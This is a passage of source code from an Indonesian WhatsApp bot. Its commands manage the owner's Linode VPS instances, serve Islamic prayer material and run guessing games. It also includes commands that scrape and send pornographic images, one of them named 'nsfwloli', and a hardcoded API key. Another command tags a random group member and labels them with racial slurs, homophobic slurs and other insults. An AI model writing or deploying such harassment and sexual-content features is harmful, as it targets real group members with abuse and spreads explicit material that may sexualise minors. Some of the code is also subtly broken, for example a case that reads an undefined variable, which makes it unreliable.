        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      zuu.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}

            //=============[ Nsfw Menu    ]=================//
case 'hentaivid2': {
if (!isPremium) return reply(mess.owner)
reply(mess.wait)
zuu.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!isPremium) return reply(mess.owner)
reply(mess.wait)
zuu.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
            }
            break
case 'trap' :
if (!isPremium) return reply(mess.owner)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
zuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPremium) return reply(mess.owner)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
zuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPremium) return reply(mess.owner)
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
zuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPremium) return reply(mess.owner)
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
zuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPremium) return reply(mess.owner)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/importe/nsfw/milf.json'))
var zuuyresult = pickRandom(ahegaonsfw)
zuu.sendMessage(m.chat, { caption: mess.success, image: { url: zuuyresult.url } }, { quoted: m })
break 
case 'ass':
case 'ahegao':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'eba':
case 'ero':
case 'femdom':
case 'food':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'neko-hentai':
case 'neko-hentai2':
case 'nsfwloli':
case 'orgy':
case 'panties':
case 'pussy':
case 'tentacles':
case 'thighs':
case 'hentai': {
 zuu.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 if (!isPremium) return reply(mess.owner)
try {
async function scrapeData() {
    try {
const page = Math.floor(Math.random() * 50);
        const { data } = await axios.get('https://e-hentai.org/tag/random?prev=' + page);
        const $ = cheerio.load(data);
        const results = [];
        $('.glthumb').each((index, element) => {
            const img = $(element).find('img');
            const imgSrc = img.attr('data-src');
            
            if (imgSrc) {
                results.push(imgSrc);
            }
        });
        return results
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
const jmebut = await scrapeData()
const randomUrl = getRandomElement(jmebut);
zuu.sendMessage(m.chat, { caption: mess.success, image: { url: randomUrl } }, { quoted: m })
  } catch (error) {
    return reply(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break
case 'mangasearch': {
if (!isPremium) return reply(mess.owner)
if (!text) return reply('mau cari manga apa??')
try {
const data = await KlikMangaSearch(text);
    let resultMessage = data.map(manga => 
      `🎬 *Judul:* ${manga.manga_name}\n` +
      `⭐ *Rating:* ${manga.manga_genre}\n` +
      `📖 *Deskripsi:* ${manga.manga_desc}\n` +
      `🔗 *URL:* ${manga.manga_url}\n`
    ).join('\n');
    zuu.sendMessage(
      from, 
      { 
        caption: `🌟 *Hasil Pencarian Film*\n\n${resultMessage}`, 
        image: { url: data.manga_thumb[0]}, 
      }, 
      { quoted: m }
    );
  } catch (error) {
    return reply(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break
case 'yuri':
if (!isPremium) return reply(mess.owner)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/importe/nsfw/yuri.json'))
var zuuyresult = pickRandom(ahegaonsfw)
zuu.sendMessage(m.chat, { caption: mess.success, image: { url: zuuyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPremium) return reply(mess.owner)
zuu.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/importe/nsfw/zettai.json'))
var zuuyresult = pickRandom(ahegaonsfw)
zuu.sendMessage(m.chat, { caption: mess.success, image: { url: zuuyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!isPremium) return reply(mess.owner)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return reply(mess.nsfw)
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await zuu.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!isPremium) return reply(mess.owner)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return reply(mess.nsfw)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/importe/nsfw/gifs.json'))
var zuuyresultx = pickRandom(ahegaonsfw)
    await zuu.sendMessage(m.chat,{video:zuuyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'xnxxdl': {
	if (!isPremium) return reply(mess.owner)
	if (!text) return reply(`Enter Url`)
        if (!text.includes('xnxx.com')) return reply(`Enter an xnxx link`)
        m.reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
            console.log(xn)
zuu.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.title}
▢ *🗂️ Size*: ${xn.size}
▢ *⌚Duration* ${xn.ruration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPremium && !isCreator) return reply(mess.owner)
	if (!text) return reply(`Enter Query`)
	reply("cocote")
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) reply(ff)
              }
              break
            //=============[ Islam - Feature ]=================//
            case "setkota":
                if (!text) return reply("Masukan Nama Kota Mu, harap huruf depan menggunakan huruf besar: .setkota Makassar")
                settingdb.setkota = text
                reply("Succes Change: " + text)
                break
            case "jadwalsholat":
            case "sholat":
                try {
                    if (text === "") {
                        let data = await (await fetch(`https://api.aladhan.com/v1/timingsByCity?city=${settingdb.setkota}&country=Indonesia&method=8`)).json();
                        let jadwalSholatMakasar = data.data.timings


                        Subuh = data.data.timings.Fajr

                        Dhuhr = data.data.timings.Dhuhr

                        Magrib = data.data.timings.Maghrib

                        Isha = data.data.timings.Isha

                        Asar = data.data.timings.Asr

                        m.reply(`*\`[ - J A D W A L - ]\`*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#${settingdb.setkota}

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Contoh: .jadwalsholat Yogyakarta_
`)
                    } else if (text === `${text}`) {
                        let data = await (await fetch(`https://api.aladhan.com/v1/timingsByCity?city=${text}&country=Indonesia&method=8`)).json();
                        let jadwalSholatMakasar = data.data.timings


                        Subuh = data.data.timings.Fajr

                        Dhuhr = data.data.timings.Dhuhr

                        Magrib = data.data.timings.Maghrib
                        Asar = data.data.timings.Asr
                        Isha = data.data.timings.Isha
                        m.reply(`*\`[ - J A D W A L - ]\`*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#${text}

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Contoh: .jadwalsholat Yogyakarta_
`)
                    }
                } catch (err) {
                    reply("Web Error Coba lagi Dengan Kota Yg Berbeda.")
                    console.log(err)
                }
                break

            case 'kisahnabi': {
                if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
                let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
                let kisah = await url.json().catch(_ => "Error")
                if (kisah == "Error") return reply("*Not Found*")

                let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

                m.reply(`${hasil}`)

            }
            break

            case 'asmaulhusna': {
                const contoh = `*\`「 Asmaul Husna 」\`*`
                const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
                let json = JSON.parse(JSON.stringify(global.asmaulhusna2))
                let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
                if (isNaN(args[0])) return reply(`contoh:\nasmaulhusna 1`)
                if (args[0]) {
                    if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
                    let {
                        index,
                        latin,
                        arabic,
                        translation_id,
                        translation_en
                    } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
                    return m.reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
                }
                m.reply(`${contoh} + ${data} + ${anjuran}`)
            }
            break

            case 'ayatkursi': {
                m.reply(global.ayatkursi.trim())
            }
            break

            case 'bacaansholat': {
                let bacaan = JSON.stringify(global.bacaanshalat)
                let json = JSON.parse(bacaan)
                let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
                let contoh = `*\`「 Bacaan Shalat 」\`*\n\n`
                m.reply(`${contoh} + ${data}`)
            }
            break

            case 'doaharian': {
                let src = JSON.parse(fs.readFileSync('./lib/database/doaharian.json', 'utf-8'))
                let caption = src.map((v, i) => {
                    return `
*${i + 1}.* ${v.title}

•°• Latin :
${v.latin}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
                }).join('\n\n')
                m.reply(`${caption}`)
            }
            break

            case 'niatsholat': {
                if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
                let text = q.toLowerCase() || ''
                let data = Object.values(global.niatsholat).find(v => v.solat == text)
                if (!data) return reply(`*\`[ ${txt} Tidak Ditemukan ]\`*\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
                m.reply(`*\`[ Niat Sholat ${text} ]\`*

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
            }
            break

            case 'quotesislami': {
                const randomIndex = Math.floor(Math.random() * global.qislami.length);
                const randomQuote = global.qislami[randomIndex];
                const {
                    arabic,
                    arti
                } = randomQuote;
                m.reply(`${arabic}\n${arti}`)
            }
            break

            case 'doatahlil': {
                let {
                    result
                } = JSON.parse(fs.readFileSync('./lib/database/tahlil.json', 'utf-8'))
                let caption = result.map((v, i) => {
                    return `
*${i + 1}.* ${v.title}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
                }).join('\n\n')
                m.reply(`${caption}`)
            }
            break
            //=============[ Fun - Feature ]=================//
            case 'cekkhodam':
            case 'cekkodam': {
                if (!text) return reply("ketik nama mu")

                const khodam = pickRandomArray([
                    "Kaleng Cat Avian",
                    "Pipa Rucika",
                    "King Hitam",
                    "Lemari dua Pintu",
                    "Kacang Hijau",
                    "Kulkas mini",
                    "Burung beo",
                    "Air",
                    "Api",
                    "Batu",
                    "Magnet",
                    "Sempak",
                    "Botol Tupperware",
                    "Badut Mixue",
                    "Sabun GIV",
                    "Sandal Swallow",
                    "Jarjit",
                    "Ijat",
                    "Fizi",
                    "Mail",
                    "Ehsan",
                    "Upin",
                    "Ipin",
                    "sungut lele",
                    "Tok Dalang",
                    "Opah",
                    "Opet",
                    "Alul",
                    "Pak Vinsen",
                    "Maman Resing",
                    "Pak RT",
                    "Admin ETI",
                    "Bung Towel",
                    "Lumpia Basah",
                    "Bjorka",
                    "Hacker",
                    "Martabak Manis",
                    "Baso Tahu",
                    "Tahu Gejrot",
                    "Dimsum",
                    "Seblak",
                    "Aromanis",
                    "Gelembung sabun",
                    "Kuda",
                    "Seblak Ceker",
                    "Telor Gulung",
                    "Tahu Aci",
                    "Tempe Mendoan",
                    "Nasi Kucing",
                    "Kue Cubit",
                    "Tahu Sumedang",
                    "Nasi Uduk",
                    "Wedang Ronde",
                    "Kerupuk Udang",
                    "Cilok",
                    "Cilung",
                    "Kue Sus",
                    "Jasuke",
                    "Seblak Makaroni",
                    "Sate Padang",
                    "Sayur Asem",
                    "Kromboloni",
                    "Marmut Pink",
                    "Belalang Mullet",
                    "Kucing Oren",
                    "Lintah Terbang",
                    "Singa Paddle Pop",
                    "Macan Cisewu",
                    "Vario Mber",
                    "Beat Mber",
                    "Supra Geter",
                    "Oli Samping",
                    "Knalpot Racing",
                    "Jus Stroberi",
                    "Jus Alpukat",
                    "Alpukat Kocok",
                    "Es Kopyor",
                    "Es Jeruk",
                    "@whiskeysockets/baileys",
                    "chalk",
                    "gradient-string",
                    "@adiwajshing",
                    "d-scrape",
                    "undefined",
                    "cannot read properties",
                    "performance-now",
                    "os",
                    "node-fetch",
                    "form-data",
                    "axios",
                    "util",
                    "fs-extra",
                    "scrape-primbon",
                    "child_process",
                    "emoji-regex",
                    "check-disk-space",
                    "perf_hooks",
                    "moment-timezone",
                    "cheerio",
                    "fs",
                    "process",
                    "require( . . . )",
                    "import ... from ...",
                    "rate-overlimit",
                    "Cappucino Cincau",
                    "Jasjus Melon",
                    "Teajus Apel",
                    "Pop ice Mangga",
                    "Teajus Gulabatu",
                    "Air Selokan",
                    "Air Kobokan",
                    "TV Tabung",
                    "Keran Air",
                    "Tutup Panci",
                    "Kotak Amal",
                    "Tutup Termos",
                    "Tutup Botol",
                    "Kresek Item",
                    "Kepala Casan",
                    "Ban Serep",
                    "Kursi Lipat",
                    "Kursi Goyang",
                    "Kulit Pisang",
                    "Warung Madura",
                    "Gorong-gorong",
                ])
                const response = `*${X}</ Khodam mu adalah: ${khodam} />${X}*`
                reply(response)
            }
            break
            case 'tolol':
            case 'gaguna':
            case 'jomok':
            case 'idiot':
            case 'gay':
            case 'lesbi':
            case 'anjink':
            case 'babi':
            case 'kucing':
            case 'beban':
            case 'bebankeluarga':
            case 'gadakeluarga':
            case 'miskin':
            case 'sampah':
            case 'wibu':
            case 'cantik':
            case 'ganteng':
            case 'tampan':
            case 'cute':
            case 'kind':
            case 'Islam':
            case 'kristen':
            case 'hindu':
            case 'katolik':
            case 'gandu':
            case 'madarchod':
            case 'kala':
            case 'gora':
            case 'chutiya':
            case 'nibba':
            case 'nibbi':
            case 'bhosdiwala':
            case 'chutmarika':
            case 'bokachoda':
            case 'suarerbaccha':
            case 'bolochoda':
            case 'muthal':
            case 'muthbaaz':
            case 'randibaaz':
            case 'topibaaz':
            case 'cunt':
            case 'nerd':
            case 'behenchod':
            case 'behnchoda':
            case 'bhosdika':
            case 'nerd':
            case 'mc':
            case 'bsdk':
            case 'bhosdk':
            case 'nigger':
            case 'loda':
            case 'laund':
            case 'nigga':
            case 'noobra':
            case 'tharki':
            case 'nibba':
            case 'nibbi':
            case 'mumu':
            case 'rascal':
            case 'scumbag':
            case 'nuts':
            case 'comrade':
            case 'fagot':
            case 'scoundrel':
            case 'ditch':
            case 'dope':
            case 'gucci':
            case 'lit':
            case 'dumbass':
            case 'sexy':
            case 'crackhead':
            case 'motherfucker':
            case 'dogla':
            case 'bewda':
            case 'boka':
            case 'khanki':
            case 'bal':
            case 'sucker':
            case 'fuckboy':
            case 'playboy':
            case 'fuckgirl':
            case 'playgirl':
            case 'hot': {
                if (!m.isGroup) return reply('Kamu itu ' + command)
                let member = participants.map((u) => u.id)
                let org = member[Math.floor(Math.random() * member.length)]
                zuu.sendMessage(m.chat, {
                    text: `*Ni orangnya @${org.split("@")[0]} dia ${command}*`,
                    contextInfo: {
                        mentionedJid: [org],
                        forwardingScore: 9999999,
                        isForwarded: true,
                        "externalAdReply": {
                            "showAdAttribution": true,
                            "containsAutoReply": true,
                            "title": `empty`,
                            "body": global.body,
                            "previewType": "PHOTO",
                            "thumbnail": fs.readFileSync(`./assets/Galery/doc.jpg`),
                            "sourceUrl": global.sourceurl
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/importe/tictactoe.js");
                this.game = this.game ? this.game : {};
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('Kamu masih didalam game');
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
                if (room) {
                    reply('Partner ditemukan!');
                    room.o = m.chat;
                    room.game.playerO = m.sender;
                    room.state = 'PLAYING';
                    let arr = room.game.render().map(v => {
                        return {
                            X: `❌`,
                            O: `⭕`,
                            1: `1️⃣`,
                            2: `2️⃣`,
                            3: `3️⃣`,
                            4: `4️⃣`,
                            5: `5️⃣`,
                            6: `6️⃣`,
                            7: `7️⃣`,
                            8: `8️⃣`,
                            9: `9️⃣`,
                        } [v];
                    });
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
                    if (room.x !== room.o) await zuu.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    });
                    await zuu.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    });
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    };
                    if (text) room.name = text;
                    reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''));
                    this.game[room.id] = room;
                }
            }
            break
            //=================================================//
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {};
                try {
                    if (this.game) {
                        delete this.game;
                        zuu.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
                    } else if (!this.game) {
                        reply(`Session TicTacToe tidak ada`);
                    } else reply('?');
                } catch (e) {
                    reply('rusak');
                }
            }
            break;

            case 'suitpvp':
            case 'suit': {

                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
                if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
                if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
                this.suit[id] = {
                    chat: await zuu.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) zuu.sendText(m.chat, `_Waktu suit habis_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break

            case 'tebakgambar':
                if (userdb.tebakgambar === true) return reply("Ada soal yang belum terjawab.");
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json');
                let result = anu[Math.floor(Math.random() * anu.length)];
                userdb.game = true
                zuu.sendMessage(m.chat, {
                    image: {
                        url: result.img
                    },
                    caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
                }, {
                    quoted: fsaluran
                }).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase().trim().replace(/\s+/g, ' ');
                });
                console.log("Jawaban: " + result.jawaban);
                userdb.jawaban = result.jawaban
                userdb.tebakgambar = true;
                await sleep(60000);
                if (userdb.tebakgambar === false) return
                if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + userdb.jawaban);
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
                    userdb.tebakgambar = false;
                    delete tebakgambar[m.sender.split('@')[0]];
                }
                break;


            case "tebakkata":
                if (userdb.tebakkata === true) return reply("Ada soal yang belum terjawab.");
                const anuvd9 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
                const result99 = anuvd9[Math.floor(Math.random() * anuvd9.length)];
                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result99.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result99.jawaban.toLowerCase();
                });
                userdb.jawaban = result99.jawaban
                userdb.tebakkata = true
                userdb.game = true
                console.log("Jawaban: " + result99.jawaban);
                await sleep(60000);
                if (userdb.tebakkata === false) return
                if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m);
                    userdb.tebakkata = false
                    userdb.game = false
                    delete tebakkata[m.sender.split('@')[0]];
                }
                break

            case "tebakkalimat":
                if (userdb.tebakkalimat === true) return reply("Ada soal yang belum terjawab.");
                let anuka = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json');
                let result09 = anuka[Math.floor(Math.random() * anuka.length)];
                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result09.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result09.jawaban.toLowerCase();
                });
                userdb.jawaban = result09.jawaban
                userdb.tebakkalimat = true
                userdb.game = true
                console.log("Jawaban: " + result09.jawaban);
                await sleep(60000);
                if (userdb.tebakkalimat === false) return
                if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m);
                    userdb.tebakkalimat = false
                    userdb.game = false
                    delete tebakkalimat[m.sender.split('@')[0]];
                }
                break

            case "tebaklirik":
                if (userdb.tebaklirik === true) return reply("Ada soal yang belum terjawab.");
                let anuoo = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
                let result098 = anuoo[Math.floor(Math.random() * anuoo.length)];
                zuu.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result098.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
                });
                userdb.jawaban = result098.jawaban
                userdb.tebaklirik = true
                userdb.game = true
                console.log("Jawaban: " + result098.jawaban);
                await sleep(60000);
                if (userdb.tebaklirik === false) return
                if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m);
                    userdb.tebaklirik = false
                    userdb.game = false
                    delete tebaklirik[m.sender.split('@')[0]];
                }
                break

            case "tebaktebakan":
                if (userdb.tebaktebakan === true) return reply("Ada soal yang belum terjawab.");
                try {
                    let anubvb = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
                    let result77 = anubvb[Math.floor(Math.random() * anubvb.length)];
                    zuu.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result77.soal}*?\nWaktu : 60s`, m).then(() => {
